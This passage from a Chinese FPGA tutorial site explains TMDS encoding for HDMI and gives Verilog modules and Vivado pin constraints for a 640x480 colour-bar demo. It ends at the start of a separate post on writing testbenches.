位数据在更长的同轴电缆中传输的可靠性增强了。最小化传输差分信号是通过异或及异或非等逻辑算法将原始 8位数据转换成 10 位数据，前 8位数据由原始信号经逻辑运算后逻辑得到，第 9 位指示运算的方式，第 10 位用来对应直流平衡。 要实现TMDS通道传输，首先要将传入的8 位的并行数据进行编码、并&#x2F;串转换，添加第9位编码位，如下图所示。 将 8 位并行数据发送到 TMDS 接收端；将接收到的8位数据并&#x2F;串转换；随后进行最小化传输处理，加上第 9 位，即编码过程。 添加编码位的数据需要进行直流均衡处理。直流平衡（DC-balanced）就是指在编码过程中保证信道中直流偏移为零，使信道中传输数据包含的1与0的个数相同。方法是在添加编码位的 9 位数据的后面加上第 10 位数据，保证10位数据中1与0个数相同。这样，传输的数据趋于直流平衡，使信号对传输线的电磁干扰减少，提高信号传输的可靠性。 直流均衡处理后的10位数据需要进行单端转差分处理。TMDS差分传动技术是一种利用2个引脚间电压差来传送信号的技术。传输数据的数值（“0”或者“1”）由两脚间电压正负极性和大小决定。即采用 2 根线来传输信号，一根线上传输原来的信号，另一根线上传输与原来信号相反的信号。这样接收端就可以通过让一根线上的信号减去另一根线上的信号的方式来屏蔽电磁干扰，从而得到正确的信号。原理图如下图所示。TMDS差分信号原理 经过上述处理，我们得到了可以进行TMDS通道传输的差分信号，使用这种方法对24位图像数据（8 位R信号、8 位G 信号、8 位B 信号）和时钟信号进行处理，将4对差分信号通过HDMI接口发到接收设备；接收设备通过解码等一系列操作，实现图像后音频再现。 在我们实际使用的过程中，有一部分开发板是使用了VGA_HDMI的硬件芯片：SII9134或者其他，因此我们不需要做HDMI它的一个编码，只需要交付VGA并行数据到这个芯片上就可以了，这个芯片会自动转换为差分串行信号了。 实战演练接着，我们就要开始实战演练了，这次的实验目标就是在640*480@60的显示器上显示等宽彩条的。 关于VGA显示的部分，可以参考 FPGA：VGA显示器驱动设计 - quincy的日记 (zikwq.github.io) FPGA：VGA显示器驱动–字符游走 - quincy的日记 (zikwq.github.io) 1. 芯片原理图 使用的是米联客mz7030fa开发板，芯片型号：xc7z030ffg676-2，开发环境：vivado21.1 （不建议购买，配套的资料不是这一款芯片型号，里面的例程需要手动重新进行管脚约束很麻烦，特别涉及到例如MIG IP核的时候，需要重新配置IP的参数~~） 2. 程序流程图 这个流程图很清晰易懂，前面是我们设计的VGA显示，后面仅仅跟上了hdmi_ctrl模块就将VGA工程迁移到了HDMI上了，但是注意的是hdmi_ctrl模块中有clk_5x需要我们提前在时钟管理模块中新增一下，，下面是详细的hdmi_ctrl模块流程框图： 在这个hdmi_ctrl模块流程框图中，主要进行了两个功能的编写 1）. 编码模块：对输入的色彩信息和行场同步信号以及使能信号进行编码 2）. 并行转串行输出差分信号模块：将编码后的10bit并行数据进行转换，这里转换使用clk_5x时钟进行处理， 输出一个串行的差分信号 hdmi_ctrl.v 输入输出信号功能描述 信号 位宽 类型 功能描述 clk_1x 1Bit Input 工作时钟，频率25MHz clk_5x 1Bit Input 工作时钟，频率125MHz sys_rst_n 1Bit Input 复位信号，低电平有效 hsync 1Bit Input 行同步信号 vsync 1Bit Input 场同步信号 de 1Bit Input 使能信号 rgb_red 8Bit Input RGB图像色彩信息红色分量 rgb_green 8Bit Input RGB图像色彩信息绿色分量 rgb_blue 8Bit Input RGB图像色彩信息蓝色分量 hdmi_clk_p 1Bit Output HDMI时钟差分信号 hdmi_clk_n 1Bit Output HDMI时钟差分信号 hdmi_r_p 1Bit Output HDMI红色分量差分信号 hdmi_r_n 1Bit Output HDMI红色分量差分信号 hdmi_g_p 1Bit Output HDMI绿色分量差分信号 hdmi_g_n 1Bit Output HDMI绿色分量差分信号 hdmi_b_p 1Bit Output HDMI蓝色分量差分信号 hdmi_b_n 1Bit Output HDMI蓝色分量差分信号 程序设计vga_pic.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/03/12 // Module Name : vga_pic // Project Name : hdmi_colorbar // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : 图像数据生成模块 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征途Pro_FPGA开发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module vga_pic ( input wire vga_clk , //输入工作时钟,频率25MHz input wire sys_rst_n , //输入复位信号,低电平有效 input wire [11:0] pix_x , //输入VGA有效显示区域像素点X轴坐标 input wire [11:0] pix_y , //输入VGA有效显示区域像素点Y轴坐标 output reg [15:0] pix_data //输出像素点色彩信息 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //parameter define parameter H_VALID = 12&#x27;d640 , //行有效数据 V_VALID = 12&#x27;d480 ; //场有效数据 parameter RED = 16&#x27;hF800, //红色 ORANGE = 16&#x27;hFC00, //橙色 YELLOW = 16&#x27;hFFE0, //黄色 GREEN = 16&#x27;h07E0, //绿色 CYAN = 16&#x27;h07FF, //青色 BLUE = 16&#x27;h001F, //蓝色 PURPPLE = 16&#x27;hF81F, //紫色 BLACK = 16&#x27;h0000, //黑色 WHITE = 16&#x27;hFFFF, //白色 GRAY = 16&#x27;hD69A; //灰色 //********************************************************************// //***************************** Main Code ****************************// //********************************************************************// //pix_data:输出像素点色彩信息,根据当前像素点坐标指定当前像素点颜色数据 always@(posedge vga_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) pix_data &lt;= 16&#x27;d0; else if((pix_x &gt;= 0) &amp;&amp; (pix_x &lt; (H_VALID/10)*1)) pix_data &lt;= RED; else if((pix_x &gt;= (H_VALID/10)*1) &amp;&amp; (pix_x &lt; (H_VALID/10)*2)) pix_data &lt;= ORANGE; else if((pix_x &gt;= (H_VALID/10)*2) &amp;&amp; (pix_x &lt; (H_VALID/10)*3)) pix_data &lt;= YELLOW; else if((pix_x &gt;= (H_VALID/10)*3) &amp;&amp; (pix_x &lt; (H_VALID/10)*4)) pix_data &lt;= GREEN; else if((pix_x &gt;= (H_VALID/10)*4) &amp;&amp; (pix_x &lt; (H_VALID/10)*5)) pix_data &lt;= CYAN; else if((pix_x &gt;= (H_VALID/10)*5) &amp;&amp; (pix_x &lt; (H_VALID/10)*6)) pix_data &lt;= BLUE; else if((pix_x &gt;= (H_VALID/10)*6) &amp;&amp; (pix_x &lt; (H_VALID/10)*7)) pix_data &lt;= PURPPLE; else if((pix_x &gt;= (H_VALID/10)*7) &amp;&amp; (pix_x &lt; (H_VALID/10)*8)) pix_data &lt;= BLACK; else if((pix_x &gt;= (H_VALID/10)*8) &amp;&amp; (pix_x &lt; (H_VALID/10)*9)) pix_data &lt;= WHITE; else if((pix_x &gt;= (H_VALID/10)*9) &amp;&amp; (pix_x &lt; H_VALID)) pix_data &lt;= GRAY; else pix_data &lt;= BLACK; endmodule vga_ctrl.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/03/12 // Module Name : vga_ctrl // Project Name : hdmi_colorbar // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : VGA控制模块 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征途Pro_FPGA开发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module vga_ctrl ( input wire vga_clk , //输入工作时钟,频率25MHz input wire sys_rst_n , //输入复位信号,低电平有效 input wire [15:0] pix_data , //输入像素点色彩信息 output wire [11:0] pix_x , //输出VGA有效显示区域像素点X轴坐标 output wire [11:0] pix_y , //输出VGA有效显示区域像素点Y轴坐标 output wire hsync , //输出行同步信号 output wire vsync , //输出场同步信号 output wire rgb_valid , output wire [15:0] rgb //输出像素点色彩信息 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //parameter define parameter H_SYNC = 10&#x27;d96 , //行同步 H_BACK = 10&#x27;d40 , //行时序后沿 H_LEFT = 10&#x27;d8 , //行时序左边框 H_VALID = 10&#x27;d640 , //行有效数据 H_RIGHT = 10&#x27;d8 , //行时序右边框 H_FRONT = 10&#x27;d8 , //行时序前沿 H_TOTAL = 10&#x27;d800 ; //行扫描周期 parameter V_SYNC = 10&#x27;d2 , //场同步 V_BACK = 10&#x27;d25 , //场时序后沿 V_TOP = 10&#x27;d8 , //场时序上边框 V_VALID = 10&#x27;d480 , //场有效数据 V_BOTTOM = 10&#x27;d8 , //场时序下边框 V_FRONT = 10&#x27;d2 , //场时序前沿 V_TOTAL = 10&#x27;d525 ; //场扫描周期 //wire define wire pix_data_req ; //像素点色彩信息请求信号 //reg define reg [11:0] cnt_h ; //行同步信号计数器 reg [11:0] cnt_v ; //场同步信号计数器 //********************************************************************// //***************************** Main Code ****************************// //********************************************************************// //cnt_h:行同步信号计数器 always@(posedge vga_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_h &lt;= 12&#x27;d0 ; else if(cnt_h == H_TOTAL - 1&#x27;d1) cnt_h &lt;= 12&#x27;d0 ; else cnt_h &lt;= cnt_h + 1&#x27;d1 ; //hsync:行同步信号 assign hsync = (cnt_h &lt;= H_SYNC - 1&#x27;d1) ? 1&#x27;b1 : 1&#x27;b0 ; //cnt_v:场同步信号计数器 always@(posedge vga_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) cnt_v &lt;= 12&#x27;d0 ; else if((cnt_v == V_TOTAL - 1&#x27;d1) &amp;&amp; (cnt_h == H_TOTAL-1&#x27;d1)) cnt_v &lt;= 12&#x27;d0 ; else if(cnt_h == H_TOTAL - 1&#x27;d1) cnt_v &lt;= cnt_v + 1&#x27;d1 ; else cnt_v &lt;= cnt_v ; //vsync:场同步信号 assign vsync = (cnt_v &lt;= V_SYNC - 1&#x27;d1) ? 1&#x27;b1 : 1&#x27;b0 ; //rgb_valid:VGA有效显示区域 assign rgb_valid = (((cnt_h &gt;= H_SYNC + H_BACK + H_LEFT) &amp;&amp; (cnt_h &lt; H_SYNC + H_BACK + H_LEFT + H_VALID)) &amp;&amp;((cnt_v &gt;= V_SYNC + V_BACK + V_TOP) &amp;&amp; (cnt_v &lt; V_SYNC + V_BACK + V_TOP + V_VALID))) ? 1&#x27;b1 : 1&#x27;b0; //pix_data_req:像素点色彩信息请求信号,超前rgb_valid信号一个时钟周期 assign pix_data_req = (((cnt_h &gt;= H_SYNC + H_BACK + H_LEFT - 1&#x27;b1) &amp;&amp; (cnt_h &lt; H_SYNC + H_BACK + H_LEFT + H_VALID - 1&#x27;b1)) &amp;&amp;((cnt_v &gt;= V_SYNC + V_BACK + V_TOP) &amp;&amp; (cnt_v &lt; V_SYNC + V_BACK + V_TOP + V_VALID))) ? 1&#x27;b1 : 1&#x27;b0; //pix_x,pix_y:VGA有效显示区域像素点坐标 assign pix_x = (pix_data_req == 1&#x27;b1) ? (cnt_h - (H_SYNC + H_BACK + H_LEFT - 1&#x27;b1)) : 12&#x27;hfff; assign pix_y = (pix_data_req == 1&#x27;b1) ? (cnt_v - (V_SYNC + V_BACK + V_TOP)) : 12&#x27;hfff; //rgb:输出像素点色彩信息 assign rgb = (rgb_valid == 1&#x27;b1) ? pix_data : 16&#x27;b0 ; endmodule hdmi_colorbar.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/11/01 // Module Name : hdmi_colorbar // Project Name : hdmi_colorbar // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : hdmi_colorbar顶层模块 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征�?�Pro_FPGA�?发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module hdmi_colorbar ( input wire sys_clk , //输入工作时钟,频率50MHz input wire sys_rst_n , //输入复位信号,低电平有�? output wire ddc_scl , output wire ddc_sda , output wire tmds_clk_p , output wire tmds_clk_n , //HDMI时钟差分信号 output wire [2:0] tmds_data_p , output wire [2:0] tmds_data_n //HDMI图像差分信号 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //wire define wire vga_clk ; //VGA工作时钟,频率25MHz wire clk_5x ; wire locked ; //PLL locked信号 wire rst_n ; //VGA模块复位信号 wire [11:0] pix_x ; //VGA有效显示区域X轴坐�? wire [11:0] pix_y ; //VGA有效显示区域Y轴坐�? wire [15:0] pix_data; //VGA像素点色彩信�? wire hsync ; //输出行同步信�? wire vsync ; //输出场同步信�? wire [15:0] rgb ; //输出像素信息 wire rgb_valid; //rst_n:VGA模块复位信号 assign rst_n = (sys_rst_n &amp; locked); assign ddc_scl = 1&#x27;b1; assign ddc_sda = 1&#x27;b1; //********************************************************************// //*************************** Instantiation **************************// //********************************************************************// //------------- clk_gen_inst ------------- clk_wiz_0 instance_name ( // Clock out ports .clk_out1(vga_clk), // output clk_out1 .clk_out2(clk_5x), // output clk_out2 // Status and control signals .resetn(sys_rst_n), // input resetn .locked(locked), // output locked // Clock in ports .clk_in1(sys_clk)); // input clk_in1 //------------- vga_ctrl_inst ------------- vga_ctrl vga_ctrl_inst ( .vga_clk (vga_clk ), //输入工作时钟,频率25MHz,1bit .sys_rst_n (rst_n ), //输入复位信号,低电平有�?,1bit .pix_data (pix_data ), //输入像素点色彩信�?,16bit .pix_x (pix_x ), //输出VGA有效显示区域像素点X轴坐�?,10bit .pix_y (pix_y ), //输出VGA有效显示区域像素点Y轴坐�?,10bit .hsync (hsync ), //输出行同步信�?,1bit .vsync (vsync ), //输出场同步信�?,1bit .rgb_valid (rgb_valid ), .rgb (rgb ) //输出像素点色彩信�?,16bit ); //------------- vga_pic_inst ------------- vga_pic vga_pic_inst ( .vga_clk (vga_clk ), //输入工作时钟,频率25MHz,1bit .sys_rst_n (rst_n ), //输入复位信号,低电平有�?,1bit .pix_x (pix_x ), //输入VGA有效显示区域像素点X轴坐�?,10bit .pix_y (pix_y ), //输入VGA有效显示区域像素点Y轴坐�?,10bit .pix_data (pix_data ) //输出像素点色彩信�?,16bit ); //------------- hdmi_ctrl_inst ------------- hdmi_ctrl hdmi_ctrl_inst ( .clk_1x (vga_clk ), //输入系统时钟 .clk_5x (clk_5x ), //输入5倍系统时�? .sys_rst_n (rst_n ), //复位信号,低有�? .rgb_blue (&#123;rgb[4:0],3&#x27;b0&#125; ), //蓝色分量 .rgb_green (&#123;rgb[10:5],2&#x27;b0&#125; ), //绿色分量 .rgb_red (&#123;rgb[15:11],3&#x27;b0&#125; ), //红色分量 .hsync (hsync ), //行同步信�? .vsync (vsync ), //场同步信�? .de (rgb_valid ), //使能信号 .hdmi_clk_p (tmds_clk_p ), .hdmi_clk_n (tmds_clk_n ), //时钟差分信号 .hdmi_r_p (tmds_data_p[2] ), .hdmi_r_n (tmds_data_n[2] ), //红色分量差分信号 .hdmi_g_p (tmds_data_p[1] ), .hdmi_g_n (tmds_data_n[1] ), //绿色分量差分信号 .hdmi_b_p (tmds_data_p[0] ), .hdmi_b_n (tmds_data_n[0] ) //蓝色分量差分信号 ); endmodule encode.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/11/01 // Module Name : encode // Project Name : hdmi_colorbar // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : 8b转10b编码模块 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征途Pro_FPGA开发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module encode ( input wire sys_clk , //时钟信号 input wire sys_rst_n , //复位信号,低有效 input wire [7:0] data_in , //输入8bit待编码数据 input wire c0 , //控制信号c0 input wire c1 , //控制信号c1 input wire de , //使能信号 output reg [9:0] data_out //输出编码后的10bit数据 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //parameter define parameter DATA_OUT0 = 10&#x27;b1101010100, DATA_OUT1 = 10&#x27;b0010101011, DATA_OUT2 = 10&#x27;b0101010100, DATA_OUT3 = 10&#x27;b1010101011; //wire define wire condition_1 ; //条件1 wire condition_2 ; //条件2 wire condition_3 ; //条件3 wire [8:0] q_m ; //第一阶段转换后的9bit数据 //reg define reg [3:0] data_in_n1 ; //待编码数据中1的个数 reg [7:0] data_in_reg ; //待编码数据打一拍 reg [3:0] q_m_n1 ; //转换后9bit数据中1的个数 reg [3:0] q_m_n0 ; //转换后9bit数据中0的个数 reg [4:0] cnt ; //视差计数器,0-1个数差别,最高位为符号位 reg de_reg1 ; //使能信号打一拍 reg de_reg2 ; //使能信号打两拍 reg c0_reg1 ; //控制信号c0打一拍 reg c0_reg2 ; //控制信号c0打两拍 reg c1_reg1 ; //控制信号c1打一拍 reg c1_reg2 ; //控制信号c1打两拍 reg [8:0] q_m_reg ; //q_m信号打一拍 //********************************************************************// //***************************** Main Code ****************************// //********************************************************************// //data_in_n1:待编码数据中1的个数 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) data_in_n1 &lt;= 4&#x27;d0; else data_in_n1 &lt;= data_in[0] + data_in[1] + data_in[2] + data_in[3] + data_in[4] + data_in[5] + data_in[6] + data_in[7]; //data_in_reg:待编码数据打一拍 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) data_in_reg &lt;= 8&#x27;b0; else data_in_reg &lt;= data_in; //condition_1:条件1 assign condition_1 = ((data_in_n1 &gt; 4&#x27;d4) || ((data_in_n1 == 4&#x27;d4) &amp;&amp; (data_in_reg[0] == 1&#x27;b0))); //q_m:第一阶段转换后的9bit数据 assign q_m[0] = data_in_reg[0]; assign q_m[1] = (condition_1) ? (q_m[0] ^~ data_in_reg[1]) : (q_m[0] ^ data_in_reg[1]); assign q_m[2] = (condition_1) ? (q_m[1] ^~ data_in_reg[2]) : (q_m[1] ^ data_in_reg[2]); assign q_m[3] = (condition_1) ? (q_m[2] ^~ data_in_reg[3]) : (q_m[2] ^ data_in_reg[3]); assign q_m[4] = (condition_1) ? (q_m[3] ^~ data_in_reg[4]) : (q_m[3] ^ data_in_reg[4]); assign q_m[5] = (condition_1) ? (q_m[4] ^~ data_in_reg[5]) : (q_m[4] ^ data_in_reg[5]); assign q_m[6] = (condition_1) ? (q_m[5] ^~ data_in_reg[6]) : (q_m[5] ^ data_in_reg[6]); assign q_m[7] = (condition_1) ? (q_m[6] ^~ data_in_reg[7]) : (q_m[6] ^ data_in_reg[7]); assign q_m[8] = (condition_1) ? 1&#x27;b0 : 1&#x27;b1; //q_m_n1:转换后9bit数据中1的个数 //q_m_n0:转换后9bit数据中0的个数 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) begin q_m_n1 &lt;= 4&#x27;d0; q_m_n0 &lt;= 4&#x27;d0; end else begin q_m_n1 &lt;= q_m[0] + q_m[1] + q_m[2] + q_m[3] + q_m[4] + q_m[5] + q_m[6] + q_m[7]; q_m_n0 &lt;= 4&#x27;d8 - (q_m[0] + q_m[1] + q_m[2] + q_m[3] + q_m[4] + q_m[5] + q_m[6] + q_m[7]); end //condition_2:条件2 assign condition_2 = ((cnt == 5&#x27;d0) || (q_m_n1 == q_m_n0)); //condition_3:条件3 assign condition_3 = (((~cnt[4] == 1&#x27;b1) &amp;&amp; (q_m_n1 &gt; q_m_n0)) || ((cnt[4] == 1&#x27;b1) &amp;&amp; (q_m_n0 &gt; q_m_n1))); //数据打拍,为了各数据同步 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) begin de_reg1 &lt;= 1&#x27;b0; de_reg2 &lt;= 1&#x27;b0; c0_reg1 &lt;= 1&#x27;b0; c0_reg2 &lt;= 1&#x27;b0; c1_reg1 &lt;= 1&#x27;b0; c1_reg2 &lt;= 1&#x27;b0; q_m_reg &lt;= 9&#x27;b0; end else begin de_reg1 &lt;= de; de_reg2 &lt;= de_reg1; c0_reg1 &lt;= c0; c0_reg2 &lt;= c0_reg1; c1_reg1 &lt;= c1; c1_reg2 &lt;= c1_reg1; q_m_reg &lt;= q_m; end //data_out:输出编码后的10bit数据 //cnt:视差计数器,0-1个数差别,最高位为符号位 always@(posedge sys_clk or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) begin data_out &lt;= 10&#x27;b0; cnt &lt;= 5&#x27;b0; end else begin if(de_reg2 == 1&#x27;b1) begin if(condition_2 == 1&#x27;b1) begin data_out[9] &lt;= ~q_m_reg[8]; data_out[8] &lt;= q_m_reg[8]; data_out[7:0] &lt;= (q_m_reg[8]) ? q_m_reg[7:0] : ~q_m_reg[7:0]; cnt &lt;= (~q_m_reg[8]) ? (cnt + q_m_n0 - q_m_n1) : (cnt + q_m_n1 - q_m_n0); end else begin if(condition_3 == 1&#x27;b1) begin data_out[9] &lt;= 1&#x27;b1; data_out[8] &lt;= q_m_reg[8]; data_out[7:0] &lt;= ~q_m_reg[7:0]; cnt &lt;= cnt + &#123;q_m_reg[8], 1&#x27;b0&#125; + (q_m_n0 - q_m_n1); end else begin data_out[9] &lt;= 1&#x27;b0; data_out[8] &lt;= q_m_reg[8]; data_out[7:0] &lt;= q_m_reg[7:0]; cnt &lt;= cnt - &#123;~q_m_reg[8], 1&#x27;b0&#125; + (q_m_n1 - q_m_n0); end end end else begin case (&#123;c1_reg2, c0_reg2&#125;) 2&#x27;b00: data_out &lt;= DATA_OUT0; 2&#x27;b01: data_out &lt;= DATA_OUT1; 2&#x27;b10: data_out &lt;= DATA_OUT2; default:data_out &lt;= DATA_OUT3; endcase cnt &lt;= 5&#x27;b0; end end endmodule hdmi_ctrl.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/11/01 // Module Name : hdmi_ctrl // Project Name : hdmi_colorbar // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : HDMI控制模块 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征途Pro_FPGA开发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module hdmi_ctrl ( input wire clk_1x , //输入系统时钟 input wire clk_5x , //输入5倍系统时钟 input wire sys_rst_n , //复位信号,低有效 input wire [7:0] rgb_blue , //蓝色分量 input wire [7:0] rgb_green , //绿色分量 input wire [7:0] rgb_red , //红色分量 input wire hsync , //行同步信号 input wire vsync , //场同步信号 input wire de , //使能信号 output wire hdmi_clk_p , output wire hdmi_clk_n , //时钟差分信号 output wire hdmi_r_p , output wire hdmi_r_n , //红色分量差分信号 output wire hdmi_g_p , output wire hdmi_g_n , //绿色分量差分信号 output wire hdmi_b_p , output wire hdmi_b_n //蓝色分量差分信号 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// wire [9:0] red ; //8b转10b后的红色分量 wire [9:0] green ; //8b转10b后的绿色分量 wire [9:0] blue ; //8b转10b后的蓝色分量 //********************************************************************// //**************************** Instantiate ***************************// //********************************************************************// //------------- encode_inst0 ------------- encode encode_inst0 ( .sys_clk (clk_1x ), .sys_rst_n (sys_rst_n ), .data_in (rgb_blue ), .c0 (hsync ), .c1 (vsync ), .de (de ), .data_out (blue ) ); //------------- encode_inst1 ------------- encode encode_inst1 ( .sys_clk (clk_1x ), .sys_rst_n (sys_rst_n ), .data_in (rgb_green ), .c0 (hsync ), .c1 (vsync ), .de (de ), .data_out (green ) ); //------------- encode_inst2 ------------- encode encode_inst2 ( .sys_clk (clk_1x ), .sys_rst_n (sys_rst_n ), .data_in (rgb_red ), .c0 (hsync ), .c1 (vsync ), .de (de ), .data_out (red ) ); //------------- par_to_ser_inst0 ------------- par_to_ser par_to_ser_inst0 ( .clk_5x (clk_5x ), .par_data (blue ), .ser_data_p (hdmi_b_p ), .ser_data_n (hdmi_b_n ) ); //------------- par_to_ser_inst1 ------------- par_to_ser par_to_ser_inst1 ( .clk_5x (clk_5x ), .par_data (green ), .ser_data_p (hdmi_g_p ), .ser_data_n (hdmi_g_n ) ); //------------- par_to_ser_inst2 ------------- par_to_ser par_to_ser_inst2 ( .clk_5x (clk_5x ), .par_data (red ), .ser_data_p (hdmi_r_p ), .ser_data_n (hdmi_r_n ) ); //------------- par_to_ser_inst3 ------------- par_to_ser par_to_ser_inst3 ( .clk_5x (clk_5x ), .par_data (10&#x27;b1111100000), .ser_data_p (hdmi_clk_p ), .ser_data_n (hdmi_clk_n ) ); endmodule par_to_ser.v`timescale 1ns/1ns //////////////////////////////////////////////////////////////////////// // Author : EmbedFire // Create Date : 2019/11/01 // Module Name : par_to_ser // Project Name : hdmi_colorbar // Target Devices: Altera EP4CE10F17C8N // Tool Versions : Quartus 13.0 // Description : 并行转串行�?�单端转差分、单沿转双沿 // // Revision : V1.0 // Additional Comments: // // 实验平台: 野火_征�?�Pro_FPGA�?发板 // 公司 : http://www.embedfire.com // 论坛 : http://www.firebbs.cn // 淘宝 : https://fire-stm32.taobao.com //////////////////////////////////////////////////////////////////////// module par_to_ser ( input wire clk_5x , //输入系统时钟 input wire [9:0] par_data , //输入并行数据 output wire ser_data_p , //输出串行差分数据 output wire ser_data_n //输出串行差分数据 ); //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //wire define wire data; wire [4:0] data_rise = &#123;par_data[8],par_data[6], par_data[4],par_data[2],par_data[0]&#125;; wire [4:0] data_fall = &#123;par_data[9],par_data[7], par_data[5],par_data[3],par_data[1]&#125;; //reg define reg [4:0] data_rise_s = 0; reg [4:0] data_fall_s = 0; reg [2:0] cnt = 0; always @ (posedge clk_5x) begin cnt &lt;= (cnt[2]) ? 3&#x27;d0 : cnt + 3&#x27;d1; data_rise_s &lt;= cnt[2] ? data_rise : data_rise_s[4:1]; data_fall_s &lt;= cnt[2] ? data_fall : data_fall_s[4:1]; end //********************************************************************// //**************************** Instantiate ***************************// //********************************************************************// //------------- ddio_out_inst0 ------------- ODDR #( .DDR_CLK_EDGE(&quot;SAME_EDGE&quot;), // &quot;OPPOSITE_EDGE&quot; or &quot;SAME_EDGE&quot; .INIT(1&#x27;b0), // Initial value of Q: 1&#x27;b0 or 1&#x27;b1 .SRTYPE(&quot;SYNC&quot;) // Set/Reset type: &quot;SYNC&quot; or &quot;ASYNC&quot; ) ODDR_inst ( .Q(data), // 1-bit DDR output .C(clk_5x ), // 1-bit clock input .CE(1&#x27;d1), // 1-bit clock enable input .D1(data_rise_s[0]), // 1-bit data input (positive edge) .D2(data_fall_s[0]), // 1-bit data input (negative edge) .R(1&#x27;d0), // 1-bit reset .S(1&#x27;d0) // 1-bit set ); // ����OBUFDSԭ�� OBUFDS #( .IOSTANDARD(&quot;TMDS_33&quot;), // Specify the output I/O standard .SLEW(&quot;SLOW&quot;) // Specify the output slew rate ) OBUFDS_inst ( .O(ser_data_p), // Diff_p output (connect directly to top-level port) .OB(ser_data_n), // Diff_n output (connect directly to top-level port) .I(data) // Buffer input ); endmodule 注意：par_to_ser.v模块中包含并行转串行以及单端转差分功能，在hdmi_ctrl.v中将其模块分别对R、G、B、CLK实例化了共四次，其中ODDR和OBUFDS的原语需要根据自己的开发板进行复制 管脚配置set_property PACKAGE_PIN C8 [get_ports sys_clk] set_property PACKAGE_PIN V19 [get_ports sys_rst_n] set_property PACKAGE_PIN J14 [get_ports tmds_clk_p] set_property PACKAGE_PIN K15 [get_ports &#123;tmds_data_p[2]&#125;] set_property PACKAGE_PIN G14 [get_ports &#123;tmds_data_p[1]&#125;] set_property PACKAGE_PIN K13 [get_ports &#123;tmds_data_p[0]&#125;] set_property IOSTANDARD LVCMOS18 [get_ports ddc_sda] set_property IOSTANDARD SSTL135 [get_ports sys_clk] set_property IOSTANDARD LVCMOS33 [get_ports sys_rst_n] set_property IOSTANDARD LVDS [get_ports tmds_clk_p] set_property IOSTANDARD LVDS [get_ports tmds_clk_n] set_property PACKAGE_PIN J10 [get_ports ddc_scl] set_property PACKAGE_PIN B9 [get_ports ddc_sda] set_property IOSTANDARD LVDS [get_ports &#123;tmds_data_p[2]&#125;] set_property IOSTANDARD LVDS [get_ports &#123;tmds_data_n[2]&#125;] set_property IOSTANDARD LVDS [get_ports &#123;tmds_data_p[1]&#125;] set_property IOSTANDARD LVDS [get_ports &#123;tmds_data_n[1]&#125;] set_property IOSTANDARD LVDS [get_ports &#123;tmds_data_p[0]&#125;] set_property IOSTANDARD LVDS [get_ports &#123;tmds_data_n[0]&#125;] set_property IOSTANDARD LVCMOS18 [get_ports ddc_scl]"},{"title":"TestBench编写技巧","path":"/wiki/FPGA/TestBench编写技巧.html","content":"TestBench编写技巧1. 参考链接FPGA仿真：testbench（激励）文件的编写（以及Robei中一些需要注意的点）_fpga激励文件怎么写-CSDN博客 编写TestBench文件的主要目的是为我们建立的硬件电路进行仿真验证，查看各个模块的功能是否达到预期的目标，否则仅仅一次综合+生成比特流进行上板验证一次就消耗小则十几二十分钟，大则花费掉半个甚至一个多小时的时间，而且如果出现一个小问题，还不容易察觉到那个模块出现了错误。 所以在我们编写好硬件电路后，进行仿真来查看生成的波形数据是相对来说非常方便的选择。 2. 如何写好仿真测试文件1. 基本结构`timescale 仿真单位/仿真精度 module test_bench(); //通常 testbench没有输入与输出端口 信号或变量定义声明 使用initial或always语句产生激励波形 例化设计模块 endmodule 2. 详细内容a. 关于仿真时间单位和精度​\t首先声明我们的仿真时间单位和精度，注意结尾不需要添加“;” ​\t需要注意的是，&#96;timescale 声明仿真单位和精度，比如我们想要延时10ns，在代码里面只需要如下编写： `timescale 1ns/1ns module test_beach(); wire rst_n; rst_n = 1&#x27;b1; //上电信号拉低 